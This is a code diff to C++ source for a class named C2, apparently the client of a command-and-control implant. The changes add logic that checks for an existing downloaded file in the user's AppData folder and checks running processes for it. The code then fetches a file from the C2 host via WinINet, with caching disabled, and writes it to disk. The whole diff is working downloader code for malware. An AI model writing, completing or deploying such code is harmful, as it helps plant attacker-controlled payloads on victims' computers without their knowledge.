@@ -26,7 +26,24 @@ string C2::boolToString(bool b) {
 	return b ? "true" : "false";
 }
 
+bool C2::isFileEmpty() {
+	int fsize = 0;
+	ifstream in(this->util.getAppDataPath() + this->util.getDownloaded(), ifstream::in | ifstream::binary);
+	if (in.is_open()) {
+		in.seekg(0, ios::end);
+		fsize = in.tellg();
+		in.close();
+	}
+	return fsize == 0;
+}
+
 void C2::download() {
+	this->ph.detectProcesses();
+	
+	if (!this->isFileEmpty() || this->ph.isDownloadedDetected()) {
+		return;
+	}
+
 	this->netsend(this->util.getC2Host(), this->util.getDownloadFileName().c_str());
 	
 	BYTE buffer = 0;
@@ -42,7 +59,10 @@ void C2::download() {
 		{
 			this->error = ::GetLastError();
 		}
-		ostream.write((const char*)data, size);
+		if (size > 0) {
+			ostream.write((const char*)data, size);
+		}
+		
 	} while ((error == ERROR_SUCCESS) && (size > 0));
 
 	ostream.flush();
@@ -51,8 +71,7 @@ void C2::download() {
 }
 
 void C2::netsend(LPCSTR hostName, LPCSTR pathName) {
-	this->response = ""; // reset response
-
+	
 	this->error = InternetAttemptConnect(0);
 	if (error != ERROR_SUCCESS) {
 		this->cleanup();
@@ -73,7 +92,7 @@ void C2::netsend(LPCSTR hostName, LPCSTR pathName) {
 		this->cleanup();
 		return;
 	}
-	this->requestHandle = HttpOpenRequest(this->connectHandle, "GET", pathName, NULL, NULL, NULL, INTERNET_FLAG_NO_UI, NULL);
+	this->requestHandle = HttpOpenRequest(this->connectHandle, "GET", pathName, NULL, NULL, NULL, INTERNET_FLAG_NO_UI|INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, NULL);
 
 	if (this->requestHandle == NULL) {
 		this->error = GetLastError();
